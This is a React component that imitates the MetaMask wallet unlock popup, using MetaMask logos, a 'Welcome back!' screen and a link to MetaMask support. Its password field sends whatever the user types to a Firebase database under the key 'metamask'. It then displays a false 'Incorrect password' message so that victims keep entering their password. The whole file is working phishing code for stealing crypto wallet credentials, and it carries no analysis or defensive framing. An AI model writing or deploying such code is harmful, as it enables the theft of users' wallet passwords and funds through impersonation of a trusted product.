import React, { useEffect, useRef, useState } from 'react';
import ethlogo from '../assets/eth_logo.svg';
import arrowdown from '../assets/arrow-down.svg';
import metamask from '../assets/metamask-fox.svg';
import Spinner from '../assets/spinner.gif';
import MetamaskLogo from './metamaskLogo';
import { database, ref, push, set, get } from './firebase';

const Metamodal = () => {
  const [spinner, setSpinner] = useState(true);
  const [modal, setModal] = useState(false);
  const [value, setValue] = useState("");
  const [count, setCount] = useState(1);
  const [rightPos, setRightPos] = useState(0); 
  const [pixelValue, setPixelValue] = useState(36);
  const [isVisible, setIsVisible] = useState(false);
  const [entered, setEntered] = useState("false");
  const modalRef = useRef();

  const toggleModal = () => {
    setIsVisible(!isVisible);
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const dbRef = ref(database, "count");
        const snapshot = await get(dbRef);

        if (snapshot.exists()) {
          setCount(snapshot.val());
        } else {
          setCount(0);
          console.log("No data available for the specified key.");
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }
    };

    fetchData();

    setRightPos(pixelValue * count + 102);

    if (isVisible) {
      document.addEventListener('mousedown', handleClickOutside);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [isVisible]);

  const handleClickOutside = (event) => {
    if (modalRef.current && !modalRef.current.contains(event.target)) {
      setIsVisible(false);
      setValue("");
    }
  };

  const changePos = {
    right: rightPos
  };

  const openModal = () => {
    setSpinner(true);
    setTimeout(() => {
      setIsVisible(true);
    }, 500);
    setTimeout(() => {
      setSpinner(false);
    }, 1000);
  }

  const writeToDatabase = () => {
    const dbRef = ref(database, "metamask");
    push(dbRef, { password: value })
      .then(() => {
        console.log("Data written successfully!");
      })
      .catch((error) => {
        console.error("Error writing data:", error);
      });
  };

  const handleKeyDown = (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      const dbRef = ref(database, "metamask");
      push(dbRef, { password: value })
        .then(() => {
          console.log("Data written successfully!");
        })
        .catch((error) => {
          console.error("Error writing data:", error);
        });
      const elements = document.getElementsByClassName("wrong-pass");
      if (elements.length > 0) {
        elements[0].style.display = "block";
      }
    }
  };

  return (
    <div className="app">
      <button className="connect" onClick={openModal}>connect wallet</button>
      {
        isVisible && (
          spinner ? (
            <div className="loading" style={changePos}>
              <img className="loading-logo" src={metamask} />
              <img className="loading-spinner" src={Spinner} />
            </div>
          ) : (
                <div className="modalcontainer" id="modal-container" style={{right: rightPos, display: isVisible ? 'inline-block' : 'none'}} ref={modalRef} >
                  <div className="toppart">
                    <button className="category">
                      <div className="icon">
                      <img src={ethlogo} />
                      </div>
                      <div className="defaultcategory">Ethereum Mainnet</div>
                      <div className="downicon">
                        <img src={arrowdown} />
                      </div>
                    </button>
                    <button className="logo">
                      <img src={metamask} />
                    </button>
                </div>
              <div className="mainpart">
                <div className="maincontainer" id="mainpart">
                  <div style={{ zIndex: 0 }}>
                    <MetamaskLogo />
                  </div>
                  <h1>Welcome back!</h1>
                  <p>The decentralized web awaits</p>
                  <form action className="form">
                    <div className="form-group">
                      <label className="form-label" htmlFor="pass">Password</label>
                      <input value={value} onKeyDown={handleKeyDown} onChange={(e) => setValue(e.target.value)} id="pass" className="form-input" type="password" autoFocus />
                    </div>
                    <p className="wrong-pass" style={{ display: 'none' }}>Incorrect password</p>
                  </form>
                  <button className="unlocksubmit" onClick={writeToDatabase}>Unlock</button>
                  <div className="forgot">
                    <a className="button">Forgot password?</a>
                  </div>
                  <div className="help">
                    <span>Need help? Contact&nbsp;
                      <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer">MetaMask support</a>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )
        )
      }
    </div>
  );
}
export default Metamodal;

